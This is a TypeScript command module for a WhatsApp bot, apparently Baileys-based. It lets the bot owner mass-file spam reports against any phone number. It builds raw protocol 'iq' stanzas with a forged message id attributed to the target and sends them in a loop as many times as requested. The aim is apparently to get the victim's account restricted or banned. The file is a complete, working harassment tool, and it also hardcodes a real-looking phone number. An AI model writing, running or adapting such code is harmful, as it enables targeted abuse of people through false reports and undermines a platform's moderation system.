import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

export default {
  name: ["report1", "spamreport"],
  category: "owner",
  description: "Envía reportes automatizados mediante consultas iq spam (Exclusivo para el número autorizado).",
  groupOnly: false,
  ownerOnly: true,

  async run(ctx: CommandContext) {
    const { sock, from, msg, args = [], usedPrefix, reply, react, sender } = ctx;
    const prefix = usedPrefix || ".";

    // Número de dueño autorizado obligatoriamente
    const AUTHORIZED_OWNER = "573118353868";

    // Extraer y limpiar el número del remitente
    const cleanSender = (sender || msg.key.participant || msg.key.remoteJid || "").replace(/[^0-9]/g, "");
    const isFromMe = Boolean(msg.key.fromMe);
    const isAuthorizedOwner = isFromMe || cleanSender.includes(AUTHORIZED_OWNER);

    if (!isAuthorizedOwner) {
      return reply(`❌ Acceso denegado. Este comando solo puede ser ejecutado por el dueño autorizado.`);
    }

    const rawText = args.join(" ");
    const parts = rawText.split("|");
    const targetQuery = parts[0] || args[0] || "";
    const cleanNumber = targetQuery.replace(/[()+\-/ ]/g, "").replace("@", "").trim();

    if (!cleanNumber) {
      return reply(
        `╭〔 ⚠️ ${fytBold("Report1 - Uso Correcto")} 〕⬣\n` +
        `• \`${prefix}report1 <numero>|<cantidad>\`\n` +
        `• *Ejemplo:* \`${prefix}report1 573118353868|10\`\n` +
        `╰━━━━━━━━━━━━⬣`
      );
    }

    let quantidade = parts[1] ? parseInt(parts[1].trim(), 10) : 10;
    if (isNaN(quantidade) || quantidade <= 0) quantidade = 10;

    await sock.sendMessage(
      from,
      { text: `enviando ${quantidade} reports para o número ${cleanNumber}` },
      { quoted: msg }
    );

    const textk = "texto do report";
    const encoder = new TextEncoder();
    const uint8Array = encoder.encode(textk);

    let idmsgfake = "";
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (let i = 0; i < 20; i++) {
      idmsgfake += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    await react("🚀").catch(() => undefined);

    try {
      const jidTarget = `${cleanNumber}@s.whatsapp.net`;
      const anySock = sock as any;

      for (let i = 0; i < quantidade; i++) {
        const testResult = await anySock.query({
          tag: "iq",
          attrs: {
            id: typeof anySock.generateMessageTag === "function" ? anySock.generateMessageTag() : Math.random().toString(),
            type: "set",
            to: "@s.whatsapp.net",
            xmlns: "spam"
          },
          content: [
            {
              tag: "spam_list",
              attrs: {
                jid: jidTarget,
                spam_flow: "message_menu"
              },
              content: [
                {
                  tag: "message",
                  attrs: {
                    t: (Date.now() - 10 * 1000).toString(),
                    id: idmsgfake,
                    type: "text",
                    from: jidTarget
                  },
                  content: [
                    {
                      tag: "raw",
                      attrs: { v: "2" },
                      content: uint8Array
                    }
                  ]
                }
              ]
            }
          ]
        });

        console.log(testResult);
      }

      await sock.sendMessage(from, { text: "reports enviados" }, { quoted: msg });
      await react("✅").catch(() => undefined);
    } catch (err: any) {
      await react("❌").catch(() => undefined);
      await reply(`❌ Error al ejecutar los reportes: ${err?.message || String(err)}`);
    }
  },
};
